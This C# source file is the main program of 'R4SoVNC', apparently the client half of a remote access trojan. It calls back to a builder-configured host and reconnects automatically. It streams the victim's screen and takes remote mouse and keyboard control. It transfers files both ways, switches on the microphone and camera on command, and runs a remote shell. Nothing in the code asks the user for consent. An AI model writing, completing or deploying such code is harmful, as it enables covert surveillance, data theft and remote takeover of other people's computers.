using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using R4SoVNC.Client.Capture;
using R4SoVNC.Client.FileTransfer;
using R4SoVNC.Client.Input;
using R4SoVNC.Client.Network;
using R4SoVNC.Client.Protocol;
using R4SoVNC.Client.Shell;

namespace R4SoVNC.Client
{
    internal class Program
    {
        private static ServerConnection _conn    = new();
        private static ScreenCapturer  _screen   = new(50);
        private static FileHandler     _files    = null!;
        private static AudioCapturer?  _audio;
        private static CameraCapturer? _camera;
        private static ShellHandler?   _shell;

        static void Main(string[] args)
        {
            string host = "127.0.0.1";
            int    port = 7890;

            // Load embedded config (written by builder)
            string cfgFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "config.gen.txt");
            if (File.Exists(cfgFile))
            {
                var lines = File.ReadAllLines(cfgFile);
                if (lines.Length >= 1) host = lines[0].Trim();
                if (lines.Length >= 2 && int.TryParse(lines[1].Trim(), out int p)) port = p;
            }

            _files  = new FileHandler(_conn);
            _audio  = new AudioCapturer(_conn);
            _camera = new CameraCapturer(_conn);
            _shell  = new ShellHandler(_conn);

            _conn.PacketReceived += OnPacketReceived;
            _conn.Disconnected   += () =>
            {
                Console.WriteLine("[R4SoVNC] Disconnected. Retrying in 5s...");
                _audio?.Stop();
                _camera?.Stop();
                _shell?.Stop();
                Thread.Sleep(5000);
                TryConnect(host, port);
            };

            TryConnect(host, port);
            Thread.Sleep(Timeout.Infinite);
        }

        private static void TryConnect(string host, int port)
        {
            Console.WriteLine($"[R4SoVNC] Connecting to {host}:{port}...");
            while (!_conn.Connect(host, port))
            {
                Console.WriteLine("[R4SoVNC] Retrying in 5s...");
                Thread.Sleep(5000);
            }
            Console.WriteLine("[R4SoVNC] Connected.");
            _conn.Send(new Packet(PacketType.ClientInfo, Environment.MachineName));
            Task.Run(ScreenStreamLoop);
        }

        private static async Task ScreenStreamLoop()
        {
            while (_conn.IsConnected)
            {
                try
                {
                    byte[] frame = _screen.Capture();
                    _conn.Send(new Packet(PacketType.ScreenData, frame));
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[R4SoVNC] Screen: {ex.Message}");
                }
                await Task.Delay(33);
            }
        }

        private static void OnPacketReceived(Packet packet)
        {
            switch (packet.Type)
            {
                case PacketType.MouseMove:
                    InputHandler.ApplyMouseMove(packet.Data);
                    break;
                case PacketType.MouseClick:
                    InputHandler.ApplyMouseClick(packet.Data);
                    break;
                case PacketType.MouseScroll:
                    InputHandler.ApplyMouseScroll(packet.Data);
                    break;
                case PacketType.KeyDown:
                case PacketType.KeyUp:
                    InputHandler.ApplyKey(packet.Data, packet.Type == PacketType.KeyDown);
                    break;

                case PacketType.FileListRequest:
                    _files.HandleFileListRequest(packet.GetDataAsString());
                    break;
                case PacketType.FileDownloadReq:
                    Task.Run(() => _files.HandleDownloadRequest(packet.GetDataAsString()));
                    break;
                case PacketType.FileUploadRequest:
                    _files.HandleUploadRequest(packet.Data);
                    break;
                case PacketType.FileUploadData:
                    _files.HandleUploadData(packet.Data);
                    break;
                case PacketType.FileUploadComplete:
                    _files.HandleUploadComplete();
                    break;

                case PacketType.MicStart:
                    _audio?.Start();
                    break;
                case PacketType.MicStop:
                    _audio?.Stop();
                    break;

                case PacketType.CamStart:
                    _camera?.Start();
                    break;
                case PacketType.CamStop:
                    _camera?.Stop();
                    break;

                case PacketType.ShellStart:
                    _shell?.Start();
                    break;
                case PacketType.ShellCommand:
                    _shell?.SendCommand(packet.GetDataAsString());
                    break;
                case PacketType.ShellStop:
                    _shell?.Stop();
                    break;

                case PacketType.Heartbeat:
                    _conn.Send(new Packet(PacketType.Heartbeat));
                    break;
                case PacketType.Disconnect:
                    _conn.Disconnect();
                    break;
            }
        }
    }
}
